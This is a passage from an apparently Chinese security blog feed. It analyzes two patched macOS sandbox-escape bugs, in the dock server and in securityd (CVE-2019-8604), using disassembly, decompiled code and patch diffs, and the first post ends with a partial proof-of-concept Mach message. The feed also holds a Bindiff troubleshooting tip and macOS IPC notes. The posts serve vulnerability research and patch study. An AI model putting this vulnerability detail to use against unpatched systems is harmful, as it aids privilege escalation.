_AXUnserializeCFType proc near          ; CODE XREF: _UnserializeCFType+16↑j</span><br><span class="line">__text:000000000000F043                                         ; _AXUnserializeWrapper+15↓j ...</span><br><span class="line">__text:000000000000F043</span><br><span class="line">__text:000000000000F043 var_8           = qword ptr -8</span><br><span class="line">__text:000000000000F043</span><br><span class="line">__text:000000000000F043                 push    rbp</span><br><span class="line">__text:000000000000F044                 mov     rbp, rsp</span><br><span class="line">__text:000000000000F047                 sub     rsp, 10h</span><br><span class="line">__text:000000000000F04B                 mov     [rbp+var_8], rdx</span><br><span class="line">__text:000000000000F04F                 mov     eax, 0FFFF9D8Fh</span><br><span class="line">__text:000000000000F054                 cmp     rcx, 8</span><br><span class="line">__text:000000000000F058                 jb      short loc_F0B7</span><br><span class="line">__text:000000000000F05A                 mov     qword ptr [r8], 0</span><br><span class="line">__text:000000000000F061                 mov     esi, [rdx]</span><br><span class="line">__text:000000000000F063                 cmp     esi, 6F77656Eh</span><br><span class="line">__text:000000000000F069                 jz      short loc_F073</span><br><span class="line">__text:000000000000F06B                 cmp     esi, 61656C61h</span><br><span class="line">__text:000000000000F071                 jnz     short loc_F0B7</span><br><span class="line">__text:000000000000F073</span><br><span class="line">__text:000000000000F073 loc_F073:                               ; CODE XREF: _AXUnserializeCFType+26↑j</span><br><span class="line">__text:000000000000F073                 lea     rax, [rdx+4]</span><br><span class="line">__text:000000000000F077                 mov     [rbp+var_8], rax</span><br><span class="line">__text:000000000000F07B                 mov     eax, [rdx+4]</span><br><span class="line">__text:000000000000F07E                 cmp     rax, 0Fh</span><br><span class="line">__text:000000000000F082                 jbe     short loc_F08D</span><br><span class="line">__text:000000000000F084                 lea     r9, _bogusUnserialize</span><br><span class="line">__text:000000000000F08B                 jmp     short loc_F098</span><br><span class="line">__text:000000000000F08D ; ---------------------------------------------------------------------------</span><br><span class="line">__text:000000000000F08D</span><br><span class="line">__text:000000000000F08D loc_F08D:                               ; CODE XREF: _AXUnserializeCFType+3F↑j</span><br><span class="line">__text:000000000000F08D                 lea     rdx, _sUnserializeFunctions</span><br><span class="line">__text:000000000000F094                 mov     r9, [rdx+rax*8]</span><br><span class="line">__text:000000000000F098</span><br><span class="line">__text:000000000000F098 loc_F098:                               ; CODE XREF: _AXUnserializeCFType+48↑j</span><br><span class="line">__text:000000000000F098                 add     rcx, 0FFFFFFFFFFFFFFFCh</span><br><span class="line">__text:000000000000F09C                 xor     eax, eax</span><br><span class="line">__text:000000000000F09E                 cmp     esi, 6F77656Eh</span><br><span class="line">__text:000000000000F0A4                 setz    al</span><br><span class="line">__text:000000000000F0A7                 lea     rsi, [rbp+var_8]</span><br><span class="line">__text:000000000000F0AB                 mov     rdx, rcx</span><br><span class="line">__text:000000000000F0AE                 mov     rcx, r8</span><br><span class="line">__text:000000000000F0B1                 mov     r8d, eax</span><br><span class="line">__text:000000000000F0B4                 call    r9 ; _bogusUnserialize</span><br><span class="line">__text:000000000000F0B7</span><br><span class="line">__text:000000000000F0B7 loc_F0B7:                               ; CODE XREF: _AXUnserializeCFType+15↑j</span><br><span class="line">__text:000000000000F0B7                                         ; _AXUnserializeCFType+2E↑j</span><br><span class="line">__text:000000000000F0B7                 add     rsp, 10h</span><br><span class="line">__text:000000000000F0BB                 pop     rbp</span><br><span class="line">__text:000000000000F0BC                 retn</span><br><span class="line">__text:000000000000F0BC _AXUnserializeCFType endp</span><br></pre></td></tr></table></figure><p>问题就在于这个函数里对这个未初始化的指针的处理，这个函数也没有初始化这个指针，而是直接判断<code>cmp     rcx, 8</code>，决定是否执行反序列化的操作；然而，rcx是一个可控值，这里可以控制rcx小于8，然后使<code>UnserializeCFType</code>执行失败。</p><p>这里回到这个服务的MIG handler函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v7 = UnserializeCFType(a3, a4, &amp;v89);</span><br><span class="line">v8 = objc_autorelease(*(_QWORD *)&amp;v89);</span><br></pre></td></tr></table></figure><p>它默认<code>UnserializeCFType</code>执行成功，并不考虑任何失败的情况，这就导致后面直接使用这个未初始化的指针作为<code>objc_autorelease</code>的参数。</p><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_text:0000000000010ABD</span><br><span class="line">__text:0000000000010ABD                 public _AXUnserializeCFType</span><br><span class="line">__text:0000000000010ABD _AXUnserializeCFType proc near          ; CODE XREF: _UnserializeCFType+16↑j</span><br><span class="line">__text:0000000000010ABD                                         ; _AXUnserializeWrapper+1A↓j ...</span><br><span class="line">__text:0000000000010ABD</span><br><span class="line">__text:0000000000010ABD var_8           = qword ptr -8</span><br><span class="line">__text:0000000000010ABD</span><br><span class="line">__text:0000000000010ABD                 push    rbp</span><br><span class="line">__text:0000000000010ABE                 mov     rbp, rsp</span><br><span class="line">__text:0000000000010AC1                 sub     rsp, 10h</span><br><span class="line">__text:0000000000010AC5                 mov     [rbp+var_8], rdx</span><br><span class="line">__text:0000000000010AC9                 mov     qword ptr [r8], 0</span><br><span class="line">__text:0000000000010AD0                 mov     eax, 0FFFF9D8Fh</span><br><span class="line">__text:0000000000010AD5                 cmp     rcx, 8</span><br><span class="line">__text:0000000000010AD9                 jb      short loc_10B31</span><br><span class="line">__text:0000000000010ADB                 mov     esi, [rdx]</span><br><span class="line">__text:0000000000010ADD                 cmp     esi, 6F77656Eh</span><br><span class="line">__text:0000000000010AE3                 jz      short loc_10AED</span><br></pre></td></tr></table></figure><p>在 <code>_AXUnserializeCFType</code> 对之前没初始化的指针先set NULL处理，然后再执行<code>cmp rcx 8</code>。 所以即使之前还是有未初始化的情况，在这里也彻底堵死了。</p><p>苹果的这个补法还是挺优雅的，代价也比较小，比一个handler一个handler得去做初始化的工作要方便多了 :-) </p><h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><p><a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/apple-safari-pwn2own-vuln-write-up-2018-10-29-final.pdf" target="_blank" rel="noopener">apple-safari-pwn2own-vuln-write-up-2018-10-29</a></p><h2 id="伪POC"><a href="#伪POC" class="headerlink" title="伪POC"></a><del>伪POC</del></h2><p>我没看这个洞所在的handler，而是看到了另外的类似的情况，已另外一个handler为目标写的poc    : (</p><p>有些字段瞎填的，不影响，找个老版本，改一改字段应该ok。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dock_msg</span>&#123;</span></span><br><span class="line">4<span class="keyword">mach_msg_header_t</span> hdr;</span><br><span class="line">4<span class="keyword">mach_msg_body_t</span> body;</span><br><span class="line">4<span class="keyword">mach_msg_ool_descriptor_t</span> ool_desc;</span><br><span class="line">4<span class="keyword">uint32_t</span> PAD[<span class="number">2</span>];</span><br><span class="line">4<span class="keyword">uint32_t</span> ool_size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dock_msg</span> <span class="title">m</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//header +0</span></span><br><span class="line">m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, <span class="number">0</span>);</span><br><span class="line">m.hdr.msgh_bits |= MACH_MSGH_BITS_COMPLEX; <span class="comment">// must be complex msg</span></span><br><span class="line">m.hdr.msgh_size = <span class="keyword">sizeof</span>(struct dock_msg);</span><br><span class="line">m.hdr.msgh_remote_port = service_port;</span><br><span class="line">m.hdr.msgh_local_port = <span class="number">0</span>;</span><br><span class="line">m.hdr.msgh_voucher_port = <span class="number">0</span>; <span class="comment">//anything you want :-)</span></span><br><span class="line">m.hdr.msgh_id = id;</span><br><span class="line"></span><br><span class="line"><span class="comment">//body must be 1, +0x18</span></span><br><span class="line">m.body.msgh_descriptor_count = <span class="number">1</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> *tmp = <span class="built_in">malloc</span>(<span class="number">0x1337</span>);</span><br><span class="line"><span class="comment">//ool desc 12 bytes, +0x1c</span></span><br><span class="line"></span><br><span class="line">m.ool_desc.address = tmp;</span><br><span class="line">m.ool_desc.deallocate = <span class="number">0</span>;</span><br><span class="line">m.ool_desc.copy = <span class="number">0</span>;</span><br><span class="line">m.ool_desc.pad1 = <span class="number">0</span>;</span><br><span class="line">m.ool_desc.type = <span class="number">1</span>;</span><br><span class="line">m.ool_desc.<span class="built_in">size</span> = <span class="number">0x1337</span>; <span class="comment">//这个就是 cmp rcx, 8 的rcx</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// padding, +0x28</span></span><br><span class="line">m.PAD[<span class="number">0</span>] = <span class="number">0x1337</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ool size +0x34</span></span><br><span class="line">m.ool_size = <span class="number">0x1337</span>;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;info&quot;&gt;&lt;a href=&quot;#info&quot; class=&quot;headerlink&quot; title=&quot;info&quot;&gt;&lt;/a&gt;info&lt;/h2&gt;&lt;p&gt;MWR Lab在pwn2own2018用来macOS上一整套利用的sbx部分漏洞分析，这个漏洞发生在&lt;code&gt;com.apple.dock.server&lt;/code&gt;服务，是一个栈指针未初始化。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="macOS" scheme="http://o0xmuhe.me/tags/macOS/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-8604 analysis</title>
    <link href="http://o0xmuhe.me/2019/09/02/CVE-2019-8604-analysis/"/>
    <id>http://o0xmuhe.me/2019/09/02/CVE-2019-8604-analysis/</id>
    <published>2019-09-02T07:48:33.000Z</published>
    <updated>2019-09-02T08:19:00.282Z</updated>
    
    <content type="html"><![CDATA[<h2 id="info"><a href="#info" class="headerlink" title="info"></a>info</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Available for: macOS Sierra 10.12.6, macOS High Sierra 10.13.6, macOS Mojave 10.14.4</span><br><span class="line"></span><br><span class="line">Impact: An application may be able to execute arbitrary code with system privileges</span><br><span class="line"></span><br><span class="line">Description: A memory corruption issue was addressed with improved memory handling.</span><br><span class="line"></span><br><span class="line">CVE-2019-8604: Fluoroacetate working with Trend Micro&apos;s Zero Day Initiative</span><br></pre></td></tr></table></figure><a id="more"></a><p>zdi的描述:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This vulnerability allows remote attackers to escape the sandbox on affected installations of Apple Safari. An attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the securityd service. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a heap-based buffer. An attacker can leverage this in conjunction with other vulnerabilities to execute code under the context of the current user.</span><br></pre></td></tr></table></figure><p>还是zdi的描述详细，苹果的描述真的是不怎么可信。</p><h2 id="vuln"><a href="#vuln" class="headerlink" title="vuln"></a>vuln</h2><p>两种找到这个洞的方式，靠diff或者沿着这个描述尝试挖。</p><p>我首先试了试diff，因为我用的是 <code>10.14.3</code>和<code>10.14.6</code>，变化有点大，diff真的不好使。</p><p>所以我选择了第二种方式。 既然是直接获取了长度并使用，那就先确定该服务使用的ipc方式，然后找获取数据的函数的xref，然后一个一个看，没一会儿就能看到这个可疑的地方了：</p><p>10.14.3</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> __<span class="function">fastcall <span class="title">sub_100053185</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// r15</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *source; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">size_t</span> length; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">void</span> *v7; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">size_t</span> v8; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> result; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">size_t</span> v11; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+60h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  v4 = xpc_dictionary_get_string(a3, <span class="string">"_item_name"</span>);</span><br><span class="line">  source = (<span class="keyword">const</span> <span class="keyword">void</span> *)xpc_dictionary_get_data(v3, <span class="string">"_item_value"</span>, &amp;v11);</span><br><span class="line">  <span class="keyword">if</span> ( xpc_dictionary_get_value(v3, <span class="string">"_item_sensitive_value_length"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    length = xpc_dictionary_get_uint64(v3, <span class="string">"_item_sensitive_value_length"</span>);</span><br><span class="line">    v7 = <span class="built_in">malloc</span>(length);</span><br><span class="line">    <span class="built_in">memcpy</span>(v7, source, length);</span><br><span class="line">    memset_s(source, v11, <span class="number">0L</span>L, length);</span><br><span class="line">    v11 = length;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v11;</span><br><span class="line">    v7 = <span class="built_in">malloc</span>(v11);</span><br><span class="line">    <span class="built_in">memcpy</span>(v7, source, v8);</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = xpc_dictionary_get_uint64(v3, <span class="string">"_item_flags"</span>);</span><br><span class="line">  sub_100005588(&amp;v12, v4, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11, v7, v9);</span><br><span class="line">  sub_1000532D4(*(_QWORD *)(a1 + <span class="number">32</span>), &amp;v12, &amp;v12);</span><br><span class="line">  <span class="built_in">free</span>(v7);</span><br><span class="line">  sub_10005222C(&amp;v12);</span><br><span class="line">  result = __stack_chk_guard;</span><br><span class="line">  <span class="keyword">if</span> ( __stack_chk_guard == v13 )</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>copy的length可控，dst是根据用户的length分配的，但是source不一定有那么大，length又没有check，所以就越界读了。</p><h2 id="patch-by-diff"><a href="#patch-by-diff" class="headerlink" title="patch by diff"></a>patch by diff</h2><p>10.14.6</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> __<span class="function">fastcall <span class="title">sub_10004405C</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// r15</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *v6; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 length; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v8; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">size_t</span> v9; <span class="comment">// r15</span></span><br><span class="line">  __int64 v10; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v11; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">void</span> *v12; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> result; <span class="comment">// al</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">size_t</span> data_length; <span class="comment">// [rsp+18h] [rbp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v18; <span class="comment">// [rsp+24h] [rbp-7Ch]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp+70h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  v4 = a1;</span><br><span class="line">  v5 = xpc_dictionary_get_string(a3, <span class="string">"_item_name"</span>);</span><br><span class="line">  v6 = (<span class="keyword">const</span> <span class="keyword">void</span> *)xpc_dictionary_get_data(v3, <span class="string">"_item_value"</span>, &amp;data_length);</span><br><span class="line">  <span class="keyword">if</span> ( !xpc_dictionary_get_value(v3, <span class="string">"_item_sensitive_value_length"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v15 = v5;</span><br><span class="line">    v11 = data_length;</span><br><span class="line">    v12 = <span class="built_in">malloc</span>(data_length);</span><br><span class="line">    <span class="built_in">memcpy</span>(v12, v6, v11);</span><br><span class="line">LABEL_7:</span><br><span class="line">    v13 = xpc_dictionary_get_uint64(v3, <span class="string">"_item_flags"</span>);</span><br><span class="line">    sub_1000045A2(&amp;v17, v15, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)data_length, v12, v13);</span><br><span class="line">    sub_10004422A(*(_QWORD *)(v4 + <span class="number">32</span>), &amp;v17, &amp;v17);</span><br><span class="line">    <span class="built_in">free</span>(v12);</span><br><span class="line">    sub_10004306E(&amp;v17);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  length = xpc_dictionary_get_uint64(v3, <span class="string">"_item_sensitive_value_length"</span>);</span><br><span class="line">  v8 = length;</span><br><span class="line">  v9 = data_length;</span><br><span class="line">  <span class="keyword">if</span> ( length &lt;= data_length )                  <span class="comment">// add length check</span></span><br><span class="line">  &#123;</span><br><span class="line">    v15 = v5;</span><br><span class="line">    v12 = <span class="built_in">malloc</span>(length);</span><br><span class="line">    <span class="built_in">memcpy</span>(v12, v6, v8);</span><br><span class="line">    memset_s(v6, v9, <span class="number">0L</span>L, v8);</span><br><span class="line">    data_length = v8;</span><br><span class="line">    v4 = a1;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = sub_100093B1E(<span class="string">"SecurityAgentXPCQuery"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)os_log_type_enabled(v10, <span class="number">0L</span>L) )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = <span class="number">134217984</span>;</span><br><span class="line">    v18 = v8;</span><br><span class="line">    _os_log_impl(&amp;_mh_execute_header, v10, <span class="number">0L</span>L, aSensitiveDataL, &amp;v17, <span class="number">12L</span>L);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_8:</span><br><span class="line">  result = __stack_chk_guard;</span><br><span class="line">  <span class="keyword">if</span> ( __stack_chk_guard == v19 )</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>取了要copy的data的长度，并且检查了用户传递来的size是不是小于等于这个值，之后再拷贝。</p><h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><p><a href="https://www.zerodayinitiative.com/advisories/ZDI-19-766/" target="_blank" rel="noopener">ZDI-19-766</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;info&quot;&gt;&lt;a href=&quot;#info&quot; class=&quot;headerlink&quot; title=&quot;info&quot;&gt;&lt;/a&gt;info&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Available for: macOS Sierra 10.12.6, macOS High Sierra 10.13.6, macOS Mojave 10.14.4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Impact: An application may be able to execute arbitrary code with system privileges&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Description: A memory corruption issue was addressed with improved memory handling.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;CVE-2019-8604: Fluoroacetate working with Trend Micro&amp;apos;s Zero Day Initiative&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
      <category term="macOS" scheme="http://o0xmuhe.me/tags/macOS/"/>
    
  </entry>
  
  <entry>
    <title>Bindiff5.0 Could not create file handler fix</title>
    <link href="http://o0xmuhe.me/2019/08/22/Bindiff5-0-Could-not-create-file-handler-fix/"/>
    <id>http://o0xmuhe.me/2019/08/22/Bindiff5-0-Could-not-create-file-handler-fix/</id>
    <published>2019-08-22T02:54:40.000Z</published>
    <updated>2019-08-22T03:00:50.439Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-问题"><a href="#0x00-问题" class="headerlink" title="0x00 : 问题"></a>0x00 : 问题</h2><p>升级Mojave后(这事儿Mojave不背锅)， bindiff5.0 工作一直有问题：</p><p><code>Failed to initalize file logger. Could not create file handler</code></p><a id="more"></a><p>今天总算搞定了这个问题，记录一下过程。</p><h2 id="0x01-尝试过程"><a href="#0x01-尝试过程" class="headerlink" title="0x01 : 尝试过程"></a>0x01 : 尝试过程</h2><ol><li>重装ida 和 bindiff。 ❌</li><li>Java环境问题？ ❌</li></ol><p>后来发现是日志文件的问题，正常情况下，你的日志是在:</p><p><code>/Users/YOUR_USER_NAME/Library/Application Support/.bindiff</code></p><p>有意思的情况是，如果你之前装过其他版本的bindiff，<strong>卸载后这个目录并不会被删除</strong>，这就导致了后面高版本bindiff出现一开始的问题。笔者就是之前用ida6.8，配合bindiff4.3，所以出现了这个问题。</p><h2 id="0x02-解决方案"><a href="#0x02-解决方案" class="headerlink" title="0x02 : 解决方案"></a>0x02 : 解决方案</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rf /Users/YOUR_USER_NAME/Library/Application Support/.bindiff</span><br></pre></td></tr></table></figure><p>重新安装bindiff5.0</p><p>问题解决！happy diff， happy bug hunting！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-问题&quot;&gt;&lt;a href=&quot;#0x00-问题&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 问题&quot;&gt;&lt;/a&gt;0x00 : 问题&lt;/h2&gt;&lt;p&gt;升级Mojave后(这事儿Mojave不背锅)， bindiff5.0 工作一直有问题：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Failed to initalize file logger. Could not create file handler&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="IDA" scheme="http://o0xmuhe.me/tags/IDA/"/>
    
      <category term="Bindiff" scheme="http://o0xmuhe.me/tags/Bindiff/"/>
    
  </entry>
  
  <entry>
    <title>macOS IPC Study basic</title>
    <link href="http://o0xmuhe.me/2019/08/20/macOS-IPC-Study-basic/"/>
    <id>http://o0xmuhe.me/2019/08/20/macOS-IPC-Study-basic/</id>
    <published>2019-08-20T09:04:05.000Z</published>
    <updated>2019-08-20T09:15:29.187Z</updated>
    
    <content type="html"><![CDATA[<p>算是个读书笔记吧，把利用Port进行IPC的这个过程转成自己的理解。</p><a id="more"></a><h2 id="Scenario-1-Alice-amp-amp-Bob"><a href="#Scenario-1-Alice-amp-amp-Bob" class="headerlink" title="Scenario 1 : Alice &amp;&amp; Bob"></a>Scenario 1 : Alice &amp;&amp; Bob</h2><p>Alice 提前知道Bob，即：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Alice processes a `SEND` right to a port whose `RECEIVE` right is held by Bob.</span><br></pre></td></tr></table></figure><ol><li>Alice 创建一个临时port，她对这个port有 <code>RECEIVE</code>right</li><li>Alice 对创建的port添加 <code>SEND</code>right</li><li>Alice 使用提前知晓的对其有 <code>SEND</code>right的port，把她刚创建的临时port向Bob发过去</li><li>Bob接收到这个Alice创建的port之后，Bob可以利用这个port和Alice通信，因为这个临时port有 <code>SEND</code>right 和 <code>RECEIVE</code>right</li></ol><h2 id="Scenario-2-Bootstrap-server-regstrain"><a href="#Scenario-2-Bootstrap-server-regstrain" class="headerlink" title="Scenario 2 : Bootstrap server (regstrain)"></a>Scenario 2 : Bootstrap server (regstrain)</h2><p>场景1有点类似先有鸡和先有蛋的问题，即最开始Alice咋知道Bob的(最开始 <code>SEND</code>right 的port哪里来的？)，所以这里引入了一个中间人— <code>bootstrap</code></p><p>Bob:</p><ol><li>Bob 对 <code>bootstrap</code>server 持有 <code>SEND right</code>port</li><li>Bob 创建另外的port，对其有 <code>RECEIV right</code>, 并且对其创建 